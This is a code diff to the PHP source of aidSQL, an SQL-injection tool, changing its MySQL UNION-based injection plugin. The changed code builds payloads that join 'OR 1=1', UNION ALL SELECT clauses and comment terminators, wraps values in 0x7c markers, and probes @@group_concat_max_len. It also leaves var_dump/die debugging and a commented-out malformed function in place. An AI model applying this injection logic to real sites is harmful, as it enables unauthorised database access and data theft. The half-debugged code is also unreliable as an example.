@@ -13,15 +13,17 @@
 			private	$_fields							=	array();
 			private	$_vulnerableIndex				=	0;
 			private	$_fieldWrapping				=	NULL;
-			private	$_detected						=	NULL;
+			private	$_injection						=	NULL;
 			private	$_method							=	NULL;
+
 
 			public function injectionUnionWithConcat(){
 
 				$parser						=	new \aidSQL\parser\Generic();
 
-				$parser->setOpenTag("NULL,");
-				$parser->setCloseTag(",NULL");
+				$parser->setOpenTag("0x7c,");
+				$parser->setCloseTag(",0x7c");
+
 				$this->setParser($parser);
 
 				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;
@@ -32,9 +34,10 @@
 
 				}
 
-				$detected	=	$this->detectUnionInjection(__FUNCTION__,"CONCAT(NULL,%value%,NULL)");
+				$detected	=	$this->detectUnionInjection(__FUNCTION__,"CONCAT(0x7c,%value%,0x7c)");
+
 				var_dump($this->_detected);
-				die();	
+				die();
 				if($detected){
 
 					$this->log("FOUND UNION INJECTION WITH CONCAT",0,"light_green");
@@ -47,7 +50,6 @@
 				return FALSE;
 
 			}
-
 
 			private function detectUnionInjection($method,$wrapping=NULL,$value=NULL){
 
@@ -66,7 +68,7 @@
 
 						foreach($fieldPayloads as $payLoad){
 
-							foreach($commentPayloads as $comment){
+							foreach($commentPayloads as $comment) {
 
 								$queryBuilder	=	new \aidSQL\core\QueryBuilder();
 
@@ -79,7 +81,9 @@
 								$queryBuilder->union($values,"ALL");
 								$queryBuilder->setCommentOpen($comment);
 
-								$sql	=	$value.$payLoad.$queryBuilder->getSpaceCharacter().$queryBuilder->getSQL().$comment;
+								$space	=	$queryBuilder->getSpaceCharacter();
+
+								$sql		=	$value.$space."OR".$space."1=1"."$space$payLoad$space".$queryBuilder->getSQL().$comment;
 								$queryBuilder->setSQL($sql);
 
 								if($isVulnerable	=	$this->query($queryBuilder,$requestVariable,$method)){
@@ -92,7 +96,8 @@
 																		"fieldPayload"		=>	$payLoad,
 																		"comment"			=>	$comment,
 																		"wrapping"			=>	$wrapping,
-																		"data"				=>	$isVulnerable
+																		"data"				=>	$isVulnerable,
+																		"method"				=>	$method
 	
 									);
 
@@ -174,9 +179,17 @@
 			private function getGroupConcatLength(){
 
 				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");
-				return $this->unionQuery("@@group_concat_max_len");
+				return $this->query("@@group_concat_max_len");
 
 			}
+
+/*
+			private function query($queryBuilder lala){
+
+				parent::query($queryBuilder);
+
+			}
+*/
 
 			public function getSchema($complete=TRUE){
 
